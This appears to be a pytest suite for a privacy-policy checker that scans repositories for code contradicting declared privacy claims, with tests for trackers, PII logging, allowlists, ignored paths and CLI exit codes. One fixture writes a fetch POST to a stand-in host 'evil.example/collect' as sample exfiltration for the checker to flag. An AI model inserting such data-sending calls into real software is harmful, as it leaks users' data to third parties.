import importlib.util
import json
import sys
import textwrap
from pathlib import Path

PLUGIN_ROOT = Path(__file__).parent.parent
SCRIPT_PATH = PLUGIN_ROOT / "scripts" / "check-privacy-policy.py"

_spec = importlib.util.spec_from_file_location("check_privacy_policy", SCRIPT_PATH)
mod = importlib.util.module_from_spec(_spec)
sys.modules["check_privacy_policy"] = mod
_spec.loader.exec_module(mod)


def _write(path: Path, content: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(textwrap.dedent(content).lstrip("\n"), encoding="utf-8")


def _write_config(path: Path, allowlist: list[str] | None = None) -> None:
    payload = {
        "policy": {
            "defaultPath": "PRIVACY_POLICY.md",
        },
        "source": {
            "include": ["**/*.py", "**/*.js", "*.py", "*.js"],
            "exclude": ["tests/**", "**/tests/**", "vendor/**", "**/vendor/**", "build/**", "**/build/**"],
        },
        "network": {
            "allowlistDomains": allowlist or [],
        },
        "scanner": {
            "maxFileSizeBytes": 200000,
        },
    }
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(payload, indent=2), encoding="utf-8")


def test_extract_claim_ids_deduplicates_and_preserves_order():
    policy = """
    Intro
    [privacy-claim:no_analytics_trackers]
    [privacy-claim:no_pii_logging]
    [privacy-claim:no_analytics_trackers]
    """
    assert mod.extract_claim_ids(policy) == ["no_analytics_trackers", "no_pii_logging"]


def test_classify_claims_separates_supported_and_unsupported():
    supported, unsupported = mod.classify_claims(
        ["no_pii_logging", "future_claim", "no_third_party_exfiltration"]
    )
    assert supported == ["no_pii_logging", "no_third_party_exfiltration"]
    assert unsupported == ["future_claim"]


def test_rule_matching_detects_violations_for_supported_claims(tmp_path):
    repo_root = tmp_path / "repo"
    config_path = repo_root / "plugins" / "privacy-policy-checker" / ".claude-plugin" / "config.json"

    _write_config(config_path, allowlist=["internal.example.com"])
    _write(
        repo_root / "PRIVACY_POLICY.md",
        """
        [privacy-claim:no_analytics_trackers]
        [privacy-claim:no_pii_logging]
        [privacy-claim:no_third_party_exfiltration]
        """,
    )
    _write(
        repo_root / "src" / "app.js",
        """
        gtag('config', 'GA-123');
        console.log('email', user.email);
        fetch('https://evil.example/collect', { method: 'POST' });
        fetch('https://api.internal.example.com/data', { method: 'POST' });
        """,
    )

    config, _ = mod.load_config(config_path)
    report = mod.build_report(
        repo_root=repo_root,
        policy_path=repo_root / "PRIVACY_POLICY.md",
        config=config,
        ignore_unsupported_claims=False,
    )

    assert report["status"] == "fail"
    assert report["violation_count"] == 3
    assert {v["claim_id"] for v in report["violations"]} == {
        "no_analytics_trackers",
        "no_pii_logging",
        "no_third_party_exfiltration",
    }


def test_no_analytics_trackers_detects_tracker_domains(tmp_path):
    repo_root = tmp_path / "repo"
    config_path = repo_root / "plugins" / "privacy-policy-checker" / ".claude-plugin" / "config.json"

    _write_config(config_path)
    _write(repo_root / "PRIVACY_POLICY.md", "[privacy-claim:no_analytics_trackers]\n")
    _write(
        repo_root / "src" / "tracker.js",
        "const beacon = 'https://www.google-analytics.com/g/collect?v=2';\n",
    )

    config, _ = mod.load_config(config_path)
    report = mod.build_report(
        repo_root=repo_root,
        policy_path=repo_root / "PRIVACY_POLICY.md",
        config=config,
        ignore_unsupported_claims=False,
    )

    assert report["status"] == "fail"
    assert report["violation_count"] == 1
    violation = report["violations"][0]
    assert violation["claim_id"] == "no_analytics_trackers"
    assert violation["rule_id"] == "analytics_domain"


def test_ignore_behavior_skips_tests_vendor_and_build_paths(tmp_path):
    repo_root = tmp_path / "repo"
    config_path = repo_root / "plugins" / "privacy-policy-checker" / ".claude-plugin" / "config.json"

    _write_config(config_path)
    _write(repo_root / "PRIVACY_POLICY.md", "[privacy-claim:no_analytics_trackers]\n")
    _write(repo_root / "src" / "safe.js", "const x = 1;\n")
    _write(repo_root / "tests" / "test_analytics.js", "gtag('config', 'GA-123');\n")
    _write(repo_root / "vendor" / "tracking.js", "mixpanel.track('x');\n")
    _write(repo_root / "build" / "bundle.js", "hotjar('event');\n")

    config, _ = mod.load_config(config_path)
    report = mod.build_report(
        repo_root=repo_root,
        policy_path=repo_root / "PRIVACY_POLICY.md",
        config=config,
        ignore_unsupported_claims=False,
    )

    assert report["status"] == "pass"
    assert report["violation_count"] == 0
    assert report["scanned_files"] == 1


def test_unsupported_claim_handling_errors_by_default_and_warns_when_ignored(tmp_path):
    repo_root = tmp_path / "repo"
    config_path = repo_root / "plugins" / "privacy-policy-checker" / ".claude-plugin" / "config.json"

    _write_config(config_path)
    _write(repo_root / "PRIVACY_POLICY.md", "[privacy-claim:future_privacy_claim]\n")

    config, _ = mod.load_config(config_path)

    strict_report = mod.build_report(
        repo_root=repo_root,
        policy_path=repo_root / "PRIVACY_POLICY.md",
        config=config,
        ignore_unsupported_claims=False,
    )
    assert strict_report["status"] == "error"
    assert strict_report["unsupported_claims"] == ["future_privacy_claim"]
    assert mod.exit_code_for_report(strict_report) == 2

    lenient_report = mod.build_report(
        repo_root=repo_root,
        policy_path=repo_root / "PRIVACY_POLICY.md",
        config=config,
        ignore_unsupported_claims=True,
    )
    assert lenient_report["status"] == "pass"
    assert lenient_report["unsupported_claims"] == ["future_privacy_claim"]
    assert lenient_report["warnings"]
    assert mod.exit_code_for_report(lenient_report) == 0


def test_cli_exit_semantics(tmp_path, capsys):
    repo_root = tmp_path / "repo"
    config_path = repo_root / "plugins" / "privacy-policy-checker" / ".claude-plugin" / "config.json"
    _write_config(config_path)

    _write(repo_root / "PRIVACY_POLICY.md", "[privacy-claim:no_pii_logging]\n")
    _write(repo_root / "src" / "safe.py", "print('hello world')\n")

    ok_code = mod.main(
        [
            "--repo-root",
            str(repo_root),
            "--policy-path",
            str(repo_root / "PRIVACY_POLICY.md"),
            "--config",
            str(config_path),
            "--format",
            "json",
        ]
    )
    assert ok_code == 0
    ok_output = json.loads(capsys.readouterr().out)
    assert ok_output["status"] == "pass"

    _write(repo_root / "src" / "bad.py", "logger.info('email=%s', user_email)\n")
    fail_code = mod.main(
        [
            "--repo-root",
            str(repo_root),
            "--policy-path",
            str(repo_root / "PRIVACY_POLICY.md"),
            "--config",
            str(config_path),
            "--format",
            "json",
        ]
    )
    assert fail_code == 1
    fail_output = json.loads(capsys.readouterr().out)
    assert fail_output["status"] == "fail"
    assert fail_output["violation_count"] == 1

    error_code = mod.main(
        [
            "--repo-root",
            str(repo_root),
            "--policy-path",
            str(repo_root / "MISSING_POLICY.md"),
            "--config",
            str(config_path),
            "--format",
            "json",
        ]
    )
    assert error_code == 2
    error_output = json.loads(capsys.readouterr().out)
    assert error_output["status"] == "error"
    assert "Policy file not found" in error_output["errors"][0]
